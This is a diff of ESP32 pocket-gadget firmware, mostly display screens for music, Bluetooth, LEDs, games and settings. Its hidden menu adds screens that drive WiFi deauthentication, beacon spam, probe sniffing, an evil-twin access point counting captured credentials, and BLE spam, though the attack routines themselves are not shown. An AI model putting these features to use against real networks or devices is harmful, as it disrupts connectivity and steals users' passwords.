-  char b[24]; snprintf(b,sizeof(b),"%.20s",songNames[playingIdx]);
-  display.setCursor(4, 28);
-  display.print(b);
-  display.setCursor(4, 42);
-  display.print(musicPlaying ? ">> PLAYING" : "|| PAUSED");
-  unsigned long el = (millis() - musicStart) / 1000;
-  char tb[12]; snprintf(tb,sizeof(tb),"%02lu:%02lu", el/60, el%60);
-  display.setCursor(SCR_W - 44, 42);
-  display.print(tb);
-  // Activity bars
-  for(int i=0;i<4;i++){
-    int h=2+((animFrame*(i+1))%12);
-    display.fillRect(4+i*5, 60-h, 3, h, WHITE);
-  }
-  display.setCursor(34, 58);
-  display.print("SEL=pause BACK=exit");
+  display.setCursor(34,20); display.print(SONGS[songSel].title);
+  display.setCursor(34,30); display.print(SONGS[songSel].artist);
+  for(int i=0;i<4;i++){int h=2+((animFrame*(i+1))%12);display.fillRect(100+i*5,42-h,3,h,WHITE);}
+  int elapsed=(animFrame/4)%SONGS[songSel].dur;
+  int bx=4,by=50,bw=120;
+  display.drawRoundRect(bx,by,bw,4,2,WHITE);
+  int fw=(elapsed*bw)/SONGS[songSel].dur;
+  if(fw>0) display.fillRoundRect(bx,by,fw,4,2,WHITE);
+  char tb[12]; snprintf(tb,sizeof(tb),"%d:%02d",elapsed/60,elapsed%60);
+  display.setCursor(4,56); display.print(tb);
+  char tb2[12]; snprintf(tb2,sizeof(tb2),"%d:%02d",SONGS[songSel].dur/60,SONGS[songSel].dur%60);
+  display.setCursor(102,56); display.print(tb2);
   display.display();
 }
 
-// ---------- BT Classic ----------
 void dBtMenu() {
   const int rowH=10, baseY=14;
   smTick((float)btMenuSel);
@@ -1071,80 +925,92 @@ void dBtMenu() {
 }
 
 void dBtSearch() {
-  btUpdateScan();
   display.clearDisplay();
-  hdrL("SCANNING BT");
-  int cx=SCR_W/2, cy=32;
+  hdrL("SCANNING");
+  int cx=SCR_W/2, cy=34;
   for (int ring=0; ring<3; ring++) {
-    int r=((animFrame*2)+ring*15)%40;
+    int r=((animFrame*2)+ring*15)%45;
     if (r<4) continue;
-    uint16_t c=(r<15)?WHITE:((r<28)?0x7BEF:0x39E7);
+    uint16_t c=(r<15)?WHITE:((r<30)?0x7BEF:0x39E7);
     display.drawCircle(cx,cy,r,c);
+    if (r>8) display.drawCircle(cx,cy,r-1,c);
   }
   display.fillCircle(cx,cy,3,WHITE);
-  display.setTextSize(1); display.setTextColor(WHITE);
-  char b[24]; snprintf(b,sizeof(b),"Found: %d", btDevCount);
-  display.setCursor(4,57); display.print(b);
-  display.setCursor(SCR_W-56, 57); display.print("BACK=stop");
-  display.display();
-  if (!btScanActive && btDevCount > 0) {
-    goToScene(S_BT_DEV);
-  } else if (!btScanActive) {
-    goToScene(S_BT_MENU);
+  float ang=animFrame*0.12f;
+  for (int len=6; len<40; len+=2) {
+    int sx=cx+(int)(cos(ang)*len), sy=cy+(int)(sin(ang)*len);
+    if (sx>=0&&sx<SCR_W&&sy>=20&&sy<56){display.drawPixel(sx,sy,WHITE);if(len<25)display.drawPixel(sx-1,sy,0x7BEF);}
   }
+  display.setTextSize(1); display.setTextColor(WHITE);
+  display.setCursor(4,57); display.print("Scanning");
+  int dots=(animFrame/4)%4;for(int i=0;i<dots;i++)display.print(".");
+  display.display();
 }
 
 void dBtDev() {
-  const int visRows=3, rowH=13, baseY=18;
-  int targetOff=(btDevSel>=2)?(btDevSel-1):0;
-  if (targetOff+visRows>btDevCount) targetOff=btDevCount-visRows;
+  const int visRows=2, cardH=20, gap=2, baseY=18;
+  int targetOff=(devSel>=1)?(devSel-1):0;
+  if (targetOff+visRows>DEV_COUNT) targetOff=DEV_COUNT-visRows;
   if (targetOff<0) targetOff=0;
   smTick((float)targetOff);
   display.clearDisplay();
   int idxLo=(int)floorf(smPos)-1, idxHi=(int)floorf(smPos)+visRows+1;
-  for (int i=idxLo; i<=idxHi; i++) {
-    if (i<0||i>=btDevCount) continue;
-    float yf=baseY+(i-smPos)*rowH;
-    if (yf<baseY-rowH||yf>baseY+visRows*rowH) continue;
+  for (int idx=idxLo; idx<=idxHi; idx++) {
+    if (idx<0||idx>=DEV_COUNT) continue;
+    float yf=baseY+(idx-smPos)*(cardH+gap);
+    if (yf<baseY-cardH||yf>baseY+visRows*(cardH+gap)) continue;
     int y=(int)roundf(yf);
-    bool isSel=(i==btDevSel);
-    if (isSel) { display.fillRoundRect(2,y,SCR_W-4,rowH-2,4,WHITE); display.setTextColor(BLACK); }
-    else       { display.drawRoundRect(2,y,SCR_W-4,rowH-2,4,WHITE); display.setTextColor(WHITE); }
-    display.setTextSize(1);
-    display.setCursor(6,y+2);
-    char b[24]; snprintf(b,sizeof(b),"%.16s",btDevs[i].name);
-    display.print(b);
-    display.setCursor(6,y+8);
-    display.print(btDevs[i].addr);
+    bool isSel=(idx==devSel);
+    if (isSel) { display.fillRoundRect(2,y,SCR_W-4,cardH,6,WHITE); display.fillRoundRect(0,y,4,cardH,2,WHITE); }
+    else       { display.drawRoundRect(2,y,SCR_W-4,cardH,6,WHITE); }
+    uint16_t c=isSel?BLACK:WHITE;
+    switch(DEVS[idx].t){case 0:iEarbud(8,y+2,c);break;case 1:iSpkBox(8,y+2,c);break;case 2:iPhone(8,y+2,c);break;}
+    display.setTextSize(1); display.setTextColor(c);
+    char b[20]; snprintf(b,sizeof(b),"%.15s",DEVS[idx].n);
+    display.setCursor(22,y+2); display.print(b);
+    char mac[20]; snprintf(mac,sizeof(mac),"%02X:%02X:%02X:..",DEVS[idx].mac[0],DEVS[idx].mac[1],DEVS[idx].mac[2]);
+    display.setCursor(22,y+11); display.print(mac);
+    drawSignalBars(SCR_W-22,y+cardH-4,DEVS[idx].rssi,c);
   }
-  hdrL("BT DEVICES");
+  hdrL("FOUND DEVICES");
   display.display();
 }
 
-void dBtHid() {
+void dBtConn() {
   display.clearDisplay();
-  hdrL("HID KEYBOARD");
-  display.setTextSize(1); display.setTextColor(WHITE);
-  if (!bleKeyboard) {
-    display.setCursor(20, 30); display.print("HID not ready");
-    display.setCursor(20, 44); display.print("BACK to exit");
-    display.display();
-    return;
+  int cx=SCR_W/2, cy=32, hexR=20;
+  float angleStep=6.2832f/6.0f;
+  for (int i=0;i<6;i++) {
+    float a1=i*angleStep-1.5708f, a2=(i+1)*angleStep-1.5708f;
+    int x1=cx+(int)(cos(a1)*hexR), y1=cy+(int)(sin(a1)*hexR);
+    int x2=cx+(int)(cos(a2)*hexR), y2=cy+(int)(sin(a2)*hexR);
+    display.drawLine(x1,y1,x2,y2,0x39E7);
   }
-  display.setCursor(4, 18);
-  display.print("Name: ESPocket-Key");
-  display.setCursor(4, 30);
-  display.print(bleKeyboard->isConnected() ? "CONNECTED" : "Waiting pair...");
-  display.setCursor(4, 44);
-  display.print("SEL: send 'Hello!'");
-  display.setCursor(4, 54);
-  display.print("BACK: exit");
+  float t=(millis()-sceneStartMs)/3500.0f;
+  if (t>1.0f) t=1.0f;
+  float e=1.0f-(1.0f-t)*(1.0f-t)*(1.0f-t);
+  int prog=(int)roundf(e*100.0f);
+  float totalAngle=(prog/100.0f)*6.2832f;
+  for (float a=-1.5708f; a<-1.5708f+totalAngle; a+=0.08f) {
+    int px=cx+(int)(cos(a)*(hexR+4)), py=cy+(int)(sin(a)*(hexR+4));
+    display.drawPixel(px,py,WHITE); display.drawPixel(px+1,py,WHITE);
+  }
+  display.drawCircle(cx,cy,hexR+4,0x18E3);
+  display.fillRect(0,0,SCR_W,13,BLACK);
+  display.setTextSize(1); display.setTextColor(WHITE);
+  const char* name=DEVS[connDevIdx].n;
+  int nw=strlen(name)*6;
+  display.setCursor((SCR_W-nw)/2,4); display.print(name);
+  char pbuf[8]; snprintf(pbuf,sizeof(pbuf),"%d%%",prog);
+  display.setCursor(4,57); display.print(pbuf);
+  const char* st=(prog>=100)?"CONNECTED":"CONNECTING";
+  int sw=strlen(st)*6;
+  display.setCursor(SCR_W-sw-4,57); display.print(st);
   display.display();
 }
 
-// ---------- LED ----------
 void dLedMenu() {
-  const int rowH=11, baseY=14;
+  const int rowH=10, baseY=14;
   smTick((float)ledMenuSel);
   display.clearDisplay();
   hdr("LED EFFECTS");
@@ -1155,7 +1021,8 @@ void dLedMenu() {
     bool isSel=(idx==ledMenuSel);
     display.setTextColor(isSel?BLACK:WHITE);
     display.setTextSize(1);
-    iLED(6,y+1,isSel?BLACK:WHITE);
+    if (idx==3) iBT(6,y+1,isSel?BLACK:WHITE);
+    else        iLED(6,y+1,isSel?BLACK:WHITE);
     display.setCursor(20,y+1); display.print(LED_M[idx]);
   }
   display.setTextColor(WHITE);
@@ -1187,25 +1054,69 @@ void dLedFx() {
   display.display();
 }
 
-void dLedBright() {
+void dLedMus() {
+  const int visRows=4, rowH=11, baseY=16;
+  int targetOff=(lmSel>=2)?(lmSel-1):0;
+  if (targetOff+visRows>LM_COUNT) targetOff=LM_COUNT-visRows;
+  if (targetOff<0) targetOff=0;
+  smTick((float)targetOff);
   display.clearDisplay();
-  hdrL("BRIGHTNESS");
-  display.setTextSize(3); display.setTextColor(WHITE);
-  char b[8]; snprintf(b,sizeof(b),"%d%%", (ledBrightness*100)/255);
-  int tw=strlen(b)*18;
-  display.setCursor((SCR_W-tw)/2,22); display.print(b);
-  display.drawRect(6,52,SCR_W-12,8,WHITE);
-  int fw=(ledBrightness*(SCR_W-16))/255;
-  if(fw>0) display.fillRect(8,54,fw,4,WHITE);
-  display.setCursor(20, 62);
-  display.setTextSize(1);
-  display.print("UP/DN to change");
+  hdr("MUSIC SYNC");
+  float pillYf=baseY+(lmSel-smPos)*rowH;
+  if (pillYf>baseY-rowH && pillYf<baseY+visRows*rowH)
+    display.fillRoundRect(2,(int)roundf(pillYf),SCR_W-4,rowH-1,3,WHITE);
+  int idxLo=(int)floorf(smPos)-1, idxHi=(int)floorf(smPos)+visRows+1;
+  for (int idx=idxLo; idx<=idxHi; idx++) {
+    if (idx<0||idx>=LM_COUNT) continue;
+    float yf=baseY+(idx-smPos)*rowH;
+    if (yf<baseY-rowH||yf>baseY+visRows*rowH) continue;
+    int y=(int)roundf(yf);
+    uint16_t c=(idx==lmSel)?BLACK:WHITE;
+    display.setTextColor(c);
+    if (idx==0) iPlay(9,y+1,c); else iMusic(9,y+1,c);
+    display.setCursor(21,y+2); display.print(LM[idx]);
+  }
+  display.setTextColor(WHITE);
   display.display();
 }
 
-// ---------- Games ----------
+void dLedBright() {
+  display.clearDisplay();
+  hdrL("BRIGHTNESS");
+  int pct=(int)roundf(50+50*sinf(animFrame*0.045f));
+  display.setTextSize(3); display.setTextColor(WHITE);
+  char b[8]; snprintf(b,sizeof(b),"%d%%",pct);
+  int tw=strlen(b)*18;
+  display.setCursor((SCR_W-tw)/2,22); display.print(b);
+  display.drawRect(6,52,SCR_W-12,8,WHITE);
+  int fw=(pct*(SCR_W-16))/100;
+  if(fw>0) display.fillRect(8,54,fw,4,WHITE);
+  display.display();
+}
+
+void dLedWifi() {
+  display.clearDisplay();
+  hdrL("WIFI CONTROL");
+  int cx=SCR_W/2, cy=30;
+  display.fillCircle(cx,cy+10,3,WHITE);
+  for (int arc=0; arc<3; arc++) {
+    int r=8+arc*7;
+    if ((animFrame/3+arc)%4<3) {
+      for (int a=215; a<=325; a+=6) {
+        float rad=a*3.14159f/180.0f;
+        display.fillCircle(cx+(int)(cos(rad)*r),cy+10+(int)(sin(rad)*r),1,WHITE);
+      }
+    }
+  }
+  display.setTextSize(1); display.setTextColor(WHITE);
+  const char* t="AP ACTIVE";
+  int tw=strlen(t)*6;
+  display.setCursor((SCR_W-tw)/2,52); display.print(t);
+  display.display();
+}
+
 void dGames() {
-  const int rowH=12, baseY=20;
+  const int rowH=10, baseY=14;
   smTick((float)gamesSel);
   display.clearDisplay();
   hdr("GAMES");
@@ -1216,13 +1127,14 @@ void dGames() {
     bool isSel=(idx==gamesSel);
     display.setTextColor(isSel?BLACK:WHITE);
     display.setTextSize(1);
-    iGame(6,y+2,isSel?BLACK:WHITE);
-    display.setCursor(20,y+2); display.print(GAMES_M[idx]);
+    iGame(6,y+1,isSel?BLACK:WHITE);
+    display.setCursor(20,y+1); display.print(GAMES_M[idx]);
   }
   display.setTextColor(WHITE);
   display.display();
 }
 
+// Simon
 #define SIMON_MAX_SEQ 32
 struct SimonState { uint8_t sequence[SIMON_MAX_SEQ]; int seqLen,showIdx,inputIdx; uint8_t phase; int round,score; unsigned long phaseMs,lastInputMs; int flashPad; };
 SimonState simon;
@@ -1249,6 +1161,7 @@ void dSimon(){
   display.display();
 }
 
+// Lights Out
 #define LO_SIZE 4
 #define LO_CELL 11
 #define LO_GAP  2
@@ -1286,9 +1199,8 @@ void dLights(){
   display.display();
 }
 
-// ---------- Settings / About ----------
 void dSet() {
-  const int rowH=11, baseY=14;
+  const int rowH=10, baseY=14;
   smTick((float)setSel);
   display.clearDisplay();
   hdr("SETTINGS");
@@ -1299,17 +1211,7 @@ void dSet() {
     bool isSel=(idx==setSel);
     display.setTextColor(isSel?BLACK:WHITE);
     display.setTextSize(1);
-    display.setCursor(12,y+1);
-    display.print(SET_M[idx]);
-    if (idx==0) {
-      display.setCursor(SCR_W-46, y+1);
-      if (sleepTimeout==0) display.print("off");
-      else { char b[8]; snprintf(b,sizeof(b),"%ds", sleepTimeout); display.print(b); }
-    } else if (idx==1) {
-      display.setCursor(SCR_W-40, y+1);
-      char b[8]; snprintf(b,sizeof(b),"%d%%",(ledBrightness*100)/255);
-      display.print(b);
-    }
+    display.setCursor(12,y+1); display.print(SET_M[idx]);
   }
   display.setTextColor(WHITE);
   display.display();
@@ -1320,15 +1222,15 @@ void dAbout() {
   hdrL("ABOUT");
   display.setTextSize(1); display.setTextColor(WHITE);
   lastTempC = readTempC();
-  display.setCursor(4, 15); display.print("ESPocket v11.0");
-  display.setCursor(4, 25); display.print("ESP32-WROOM-32");
-  display.setCursor(4, 35); display.print("Temp: "); display.print(lastTempC, 1); display.print(" C");
+  display.setCursor(4, 16); display.print("ESPocket v10.1");
+  display.setCursor(4, 26); display.print("ESP32-WROOM-32");
+  display.setCursor(4, 36); display.print("Temp: "); display.print(lastTempC, 1); display.print(" C");
   unsigned long up=(millis()-bootMs)/1000UL;
   unsigned long h=up/3600UL,m=(up/60UL)%60UL,s=up%60UL;
-  display.setCursor(4, 45);
-  char ub[24]; snprintf(ub,sizeof(ub),"Up: %02lu:%02lu:%02lu",h,m,s); display.print(ub);
-  display.setCursor(4, 55);
-  char hb[24]; snprintf(hb,sizeof(hb),"Heap: %u B",(unsigned)ESP.getFreeHeap()); display.print(hb);
+  display.setCursor(4, 46);
+  char ub[24]; snprintf(ub,sizeof(ub),"Uptime %02lu:%02lu:%02lu",h,m,s); display.print(ub);
+  display.setCursor(4, 56);
+  char hb[24]; snprintf(hb,sizeof(hb),"Heap %u B",(unsigned)ESP.getFreeHeap()); display.print(hb);
   display.display();
 }
 
@@ -1349,7 +1251,9 @@ void dOverheat() {
   display.display();
 }
 
-// ---------- Hidden menu screens ----------
+// ============================================================
+//  Hidden
+// ============================================================
 void dHidden() {
   const int rowH=14, baseY=17;
   smTick((float)hiddenSel);
@@ -1391,6 +1295,7 @@ void dCyberList(int sel, const char* title, const char** items, int count, float
   display.setTextColor(WHITE);
   display.display();
 }
+
 void dWifiH() { smTick((float)wifiHSel); dCyberList(wifiHSel,"WIFI_OPS",WIFI_H_M,WIFI_H_COUNT,smPos); }
 void dBtH()   { smTick((float)btHSel);   dCyberList(btHSel,"BT_OPS",BT_H_M,BT_H_COUNT,smPos); }
 
@@ -1398,7 +1303,9 @@ void dWifiScan() {
   if (!wifiScanRunning && !wifiScanDone) {
     WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
     WiFi.scanNetworks(true);
-    wifiScanRunning = true; sceneStartMs = millis();
+    wifiScanRunning = true;
+    sceneStartMs = millis();
+    Serial.println("[WIFI] scan started");
   }
   if (!wifiScanDone) {
     int n = WiFi.scanComplete();
@@ -1412,35 +1319,52 @@ void dWifiScan() {
       display.drawCircle(cx,cy,r,c);
     }
     display.fillCircle(cx,cy,3,WHITE);
+    float ang=animFrame*0.15f;
+    for(int len=6;len<36;len+=2){
+      int sx=cx+(int)(cos(ang)*len);
+      int sy=cy+(int)(sin(ang)*len);
+      if(sx>=0&&sx<SCR_W&&sy>=20&&sy<56) display.drawPixel(sx,sy,WHITE);
+    }
     display.setTextSize(1);display.setTextColor(WHITE);
     display.setCursor(4,57);
-    char b[24]; snprintf(b,sizeof(b),"Found: %d", n<0?0:n);
-    display.print(b);
+    if (n < 0) {
+      display.print("Scanning WiFi");
+      int dots=(animFrame/4)%4;for(int i=0;i<dots;i++)display.print(".");
+    } else {
+      char b[20];snprintf(b,sizeof(b),"Found %d nets", n);
+      display.print(b);
+    }
     display.display();
     if (n >= 0) {
       NET_COUNT = (n < NET_MAX) ? n : NET_MAX;
       for (int i = 0; i < NET_COUNT; i++) {
         String s = WiFi.SSID(i);
-        strncpy(NETS[i].ssid, s.c_str(), 32); NETS[i].ssid[32] = 0;
+        strncpy(NETS[i].ssid, s.c_str(), 32);
+        NETS[i].ssid[32] = 0;
         NETS[i].rssi = (int8_t)WiFi.RSSI(i);
-        NETS[i].ch = (uint8_t)WiFi.channel(i);
+        NETS[i].ch   = (uint8_t)WiFi.channel(i);
         NETS[i].locked = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
-        uint8_t* bp = WiFi.BSSID(i);
-        for (int k = 0; k < 6; k++) NETS[i].bssid[k] = bp[k];
+        uint8_t* b = WiFi.BSSID(i);
+        for (int k = 0; k < 6; k++) NETS[i].bssid[k] = b[k];
       }
       WiFi.scanDelete();
-      wifiScanDone = true; wifiScanRunning = false;
+      wifiScanDone = true;
+      wifiScanRunning = false;
       netSel = 0;
+      Serial.printf("[WIFI] scan done, %d nets\n", NET_COUNT);
       WiFi.mode(WIFI_OFF); WiFi.disconnect(true);
-      smSnapNext(); sceneStartMs = millis();
+      smSnapNext();
+      sceneStartMs = millis();
     }
     return;
   }
   if (NET_COUNT == 0) {
-    display.clearDisplay(); hdrL("NETWORKS");
+    display.clearDisplay();
+    hdrL("NETWORKS");
     display.setTextSize(1);display.setTextColor(WHITE);
-    display.setCursor(20, 30); display.print("No networks");
-    display.display(); return;
+    display.setCursor(20, 30);display.print("No networks found");
+    display.display();
+    return;
   }
   const int visRows=3,rowH=12,baseY=18;
   int targetOff=(netSel>=2)?(netSel-1):0;
@@ -1459,13 +1383,21 @@ void dWifiScan() {
     else{display.drawRoundRect(2,y,SCR_W-4,rowH-2,4,WHITE);display.setTextColor(WHITE);}
     display.setTextSize(1);
     display.setCursor(6,y+3);
-    char b[18]; snprintf(b,sizeof(b),"%.16s",NETS[si].ssid);
+    char b[18];snprintf(b,sizeof(b),"%.16s",NETS[si].ssid);
     display.print(b);
     for(int i=0;i<4;i++){
       int h=2+i*2,bx=SCR_W-22+i*3,by=y+9-h;
       int strength=constrain((NETS[si].rssi+90)/12,0,4);
       if(i<strength)display.fillRect(bx,by,2,h,isSel?BLACK:WHITE);
       else display.drawRect(bx,by,2,h,isSel?BLACK:WHITE);
+    }
+    if(NETS[si].locked){
+      uint16_t lc=isSel?BLACK:WHITE;
+      int lx=SCR_W-42,ly=y+2;
+      display.drawRect(lx,ly+3,5,4,lc);
+      display.drawPixel(lx+1,ly+2,lc);
+      display.drawPixel(lx+2,ly+1,lc);
+      display.drawPixel(lx+3,ly+2,lc);
     }
   }
   hdrL("NETWORKS");
@@ -1479,9 +1411,11 @@ void dWifiTarget() {
   display.setTextSize(1);display.setTextColor(WHITE);
   display.setCursor(2,14);
   if (targetNet >= 0 && targetNet < NET_COUNT) {
-    display.print("Tgt: ");
-    char b[18]; snprintf(b,sizeof(b),"%.14s",NETS[targetNet].ssid);
+    display.print("Target: ");
+    char b[18]; snprintf(b,sizeof(b),"%.16s",NETS[targetNet].ssid);
     display.print(b);
+  } else {
+    display.print("Target: (none)");
   }
   int rowH=10,baseY=25;
   float pillY=baseY+smPos*rowH;
@@ -1498,7 +1432,8 @@ void dWifiTarget() {
 
 void dDeauth() {
   unsigned long now = millis();
-  display.clearDisplay(); hdr("DEAUTH");
+  display.clearDisplay();
+  hdr("DEAUTH");
   display.setTextSize(1);display.setTextColor(WHITE);
   display.setCursor(2,14); display.print("TGT: ");
   if (targetNet >= 0 && targetNet < NET_COUNT) {
@@ -1512,55 +1447,71 @@ void dDeauth() {
   display.print(fb);
   unsigned long el = (now - deauthStartMs) / 1000;
   display.setCursor(2,50);
-  if (el > 0) { snprintf(fb,sizeof(fb),"Rate: %lu/s", deauthCount/el); display.print(fb); }
-  display.setCursor(2,58);display.print("BACK=stop");
+  if (el > 0) {
+    snprintf(fb,sizeof(fb),"Rate: %lu/s  T:%lus",deauthCount/el,el);
+    display.print(fb);
+  }
+  if ((animFrame/3)%2==0) display.fillCircle(SCR_W-8,6,3,WHITE);
+  else                    display.drawCircle(SCR_W-8,6,3,WHITE);
+  display.setCursor(2,58);display.print("BACK = stop");
   display.display();
-  if (now - deauthLast >= 20) { deauthLast = now; for (int i = 0; i < 5; i++) deauthRunOnce(); }
+  if (now - deauthLast >= 20) {
+    deauthLast = now;
+    for (int i = 0; i < 5; i++) deauthRunOnce();
+  }
 }
 
 void dBeacon() {
   unsigned long now = millis();
-  display.clearDisplay(); hdr("BEACON");
+  display.clearDisplay();
+  hdr("BEACON");
   display.setTextSize(1); display.setTextColor(WHITE);
   display.setCursor(2, 14); display.print("SSID: ");
   display.print(FAKE_SSIDS[beaconSSIDIdx % FAKE_SSID_COUNT]);
   display.setCursor(2, 26);
-  char b[24]; snprintf(b, sizeof(b), "Sent: %lu", beaconCount); display.print(b);
+  char b[24]; snprintf(b, sizeof(b), "Sent: %lu", beaconCount);
+  display.print(b);
   unsigned long el = (now - beaconStartMs) / 1000;
   display.setCursor(2, 38);
   if (el > 0) { snprintf(b, sizeof(b), "Rate: %lu/s", beaconCount / el); display.print(b); }
   display.setCursor(2, 50);
-  snprintf(b, sizeof(b), "Time: %lus", el); display.print(b);
-  display.setCursor(2, 58); display.print("BACK=stop");
+  snprintf(b, sizeof(b), "Time: %lus", el);
+  display.print(b);
+  if ((animFrame/3)%2==0) { display.fillCircle(SCR_W-8, 6, 3, WHITE); display.drawCircle(SCR_W-8, 6, 6, WHITE); }
+  else                    { display.drawCircle(SCR_W-8, 6, 3, WHITE); display.drawCircle(SCR_W-8, 6, 6, WHITE); }
+  display.setCursor(2, 58); display.print("BACK = stop");
   display.display();
   if (now - beaconLast >= 20) {
     beaconLast = now;
     for (int i = 0; i < 5; i++) sendBeaconSpam();
-    static uint8_t chIdx = 0;
-    static uint32_t hopCount = 0;
-    hopCount++;
-    if (hopCount % 30 == 0) {
-      chIdx = (chIdx + 1) % 3;
+    static uint8_t beaconChIdx = 0;
+    static uint32_t beaconHopCount = 0;
+    beaconHopCount++;
+    if (beaconHopCount % 30 == 0) {
+      beaconChIdx = (beaconChIdx + 1) % 3;
       uint8_t chs[3] = {1, 6, 11};
-      esp_wifi_set_channel(chs[chIdx], WIFI_SECOND_CHAN_NONE);
+      esp_wifi_set_channel(chs[beaconChIdx], WIFI_SECOND_CHAN_NONE);
     }
   }
 }
 
 void dProbe() {
   if (snifferActive) probeProcessRing();
-  static unsigned long lastHop = 0; static uint8_t hopIdx = 0;
+  static unsigned long lastHop = 0;
+  static uint8_t hopIdx = 0;
   if (snifferActive && millis() - lastHop > 500) {
     lastHop = millis();
     uint8_t chs[3] = {1, 6, 11};
     hopIdx = (hopIdx + 1) % 3;
     esp_wifi_set_channel(chs[hopIdx], WIFI_SECOND_CHAN_NONE);
   }
-  display.clearDisplay(); hdr("PROBE SNIFF");
+  display.clearDisplay();
+  hdr("PROBE SNIFF");
   display.setTextSize(1); display.setTextColor(WHITE);
-  char sb[32]; snprintf(sb, sizeof(sb), "Dev:%d Tot:%lu", probeDevCount, (unsigned long)probeTotalCount);
+  char sb[32]; snprintf(sb, sizeof(sb), "Dev:%d  Tot:%lu", probeDevCount, (unsigned long)probeTotalCount);
   display.setCursor(2, 14); display.print(sb);
-  int startIdx = (probeDevCount > 3) ? probeDevCount - 3 : 0;
+  int startIdx = 0;
+  if (probeDevCount > 3) startIdx = probeDevCount - 3;
   int rowY = 25;
   for (int i = startIdx; i < probeDevCount && rowY < 56; i++) {
     int j = -1, seen = 0;
@@ -1584,12 +1535,16 @@ void dProbe() {
 
 void dRfMon() {
   rfMonitorScan();
-  display.clearDisplay(); hdr("RF MONITOR");
+  display.clearDisplay();
+  hdr("RF MONITOR");
   display.setTextSize(1); display.setTextColor(WHITE);
   char b[24];
-  snprintf(b, sizeof(b), "Nets: %d", rfNetworkCount); display.setCursor(2, 14); display.print(b);
-  snprintf(b, sizeof(b), "Avg: %d dBm", rfAvgRssi); display.setCursor(2, 24); display.print(b);
-  snprintf(b, sizeof(b), "Max:%d  Min:%d", rfStrongest, rfWeakest); display.setCursor(2, 34); display.print(b);
+  snprintf(b, sizeof(b), "Nets: %d", rfNetworkCount);
+  display.setCursor(2, 14); display.print(b);
+  snprintf(b, sizeof(b), "Avg: %d dBm", rfAvgRssi);
+  display.setCursor(2, 24); display.print(b);
+  snprintf(b, sizeof(b), "Max: %d  Min: %d", rfStrongest, rfWeakest);
+  display.setCursor(2, 34); display.print(b);
   display.setCursor(2, 46); display.print("Ch:");
   int maxU = 1;
   for (int i = 0; i < 14; i++) if (rfChanUsage[i] > maxU) maxU = rfChanUsage[i];
@@ -1606,14 +1561,21 @@ void dRfMon() {
 void dEvil() {
   unsigned long now = millis();
   evilTwinTick();
-  display.clearDisplay(); hdr("EVIL TWIN");
+  display.clearDisplay();
+  hdr("EVIL TWIN");
   display.setTextSize(1); display.setTextColor(WHITE);
-  display.setCursor(2, 14); display.print("SSID: "); display.print(evilSSID);
+  display.setCursor(2, 14); display.print("SSID: ");
+  display.print(evilSSID);
   display.setCursor(2, 26); display.print("IP: 192.168.4.1");
   display.setCursor(2, 38);
-  char b[24]; snprintf(b, sizeof(b), "Captured: %d", evilCaptured); display.print(b);
+  char b[24]; snprintf(b, sizeof(b), "Captured: %d", evilCaptured);
+  display.print(b);
+  unsigned long el = (now - evilTwinStartMs) / 1000;
   display.setCursor(2, 50);
-  snprintf(b, sizeof(b), "Time: %lus", (now - evilTwinStartMs) / 1000); display.print(b);
+  snprintf(b, sizeof(b), "Time: %lus", el);
+  display.print(b);
+  if ((animFrame/3)%2==0) display.fillCircle(SCR_W-8, 6, 3, WHITE);
+  else                    display.drawCircle(SCR_W-8, 6, 3, WHITE);
   display.setCursor(2, 58); display.print("BACK=stop");
   display.display();
 }
@@ -1622,13 +1584,18 @@ void dBleScan() {
   if (bleScanRunning && millis() - sceneStartMs > 4000) {
     if (bleScan) { bleScan->stop(); bleScan->clearResults(); }
     bleScanRunning = false; bleScanDone = true;
+    Serial.printf("[BLE] scan done, %d devices\n", bleDevCount);
     bleDeinit();
   }
-  display.clearDisplay(); hdr("BLE SCAN");
+  display.clearDisplay();
+  hdr("BLE SCAN");
   display.setTextSize(1); display.setTextColor(WHITE);
-  char sb[24]; snprintf(sb, sizeof(sb), "Dev: %d", bleDevCount); display.setCursor(2, 14); display.print(sb);
+  char sb[24]; snprintf(sb, sizeof(sb), "Dev: %d", bleDevCount);
+  display.setCursor(2, 14); display.print(sb);
   if (bleScanRunning) {
     display.setCursor(2, 24); display.print("Scanning...");
+    int dots = (animFrame / 4) % 4;
+    for (int i = 0; i < dots; i++) display.print(".");
   } else if (bleDevCount == 0) {
     display.setCursor(2, 30); display.print("No BLE devices");
   } else {
@@ -1659,38 +1626,71 @@ void dBleScan() {
 void dBleSpam() {
   unsigned long now = millis();
   if (bleSpamRunning) bleSpamTick();
-  display.clearDisplay(); hdr("BLE SPAM");
+  display.clearDisplay();
+  hdr("BLE SPAM");
   display.setTextSize(1); display.setTextColor(WHITE);
   const char* typeName[] = {"Apple","Samsung","Microsoft"};
-  display.setCursor(2, 14); display.print("Type: "); display.print(typeName[bleSpamType]);
-  char b[24]; snprintf(b, sizeof(b), "Sent: %lu", bleSpamCount); display.setCursor(2, 26); display.print(b);
+  display.setCursor(2, 14); display.print("Type: ");
+  display.print(typeName[bleSpamType]);
+  char b[24]; snprintf(b, sizeof(b), "Sent: %lu", bleSpamCount);
+  display.setCursor(2, 26); display.print(b);
   unsigned long el = (now - bleSpamStart) / 1000;
   display.setCursor(2, 38);
   if (el > 0) { snprintf(b, sizeof(b), "Rate: %lu/s", bleSpamCount / el); display.print(b); }
   display.setCursor(2, 50);
-  snprintf(b, sizeof(b), "Time: %lus", el); display.print(b);
+  snprintf(b, sizeof(b), "Time: %lus", el);
+  display.print(b);
+  for (int i = 0; i < 4; i++) {
+    int x = SCR_W - 24 + (i % 2) * 10;
+    int y = 14 + (i / 2) * 10;
+    if ((animFrame / 3 + i) % 4 < 2) display.fillCircle(x, y, 3, WHITE);
+    else                              display.drawCircle(x, y, 3, WHITE);
+  }
   display.setCursor(2, 58); display.print("BACK=stop");
   display.display();
 }
 
 void dBleIBeacon() {
   unsigned long now = millis();
-  display.clearDisplay(); hdr("IBEACON");
+  display.clearDisplay();
+  hdr("IBEACON");
   display.setTextSize(1); display.setTextColor(WHITE);
   display.setCursor(2, 14); display.print("Broadcasting...");
   unsigned long el = (now - bleIbStart) / 1000;
-  char b[24]; snprintf(b, sizeof(b), "Uptime: %lus", el); display.setCursor(2, 26); display.print(b);
+  char b[24]; snprintf(b, sizeof(b), "Uptime: %lus", el);
+  display.setCursor(2, 26); display.print(b);
   display.setCursor(2, 38); display.print("UUID:");
   display.setCursor(2, 50); display.print("E2C56DB5-DFFB...");
+  int cx = SCR_W / 2 + 20, cy = 44;
+  int r = (animFrame % 20);
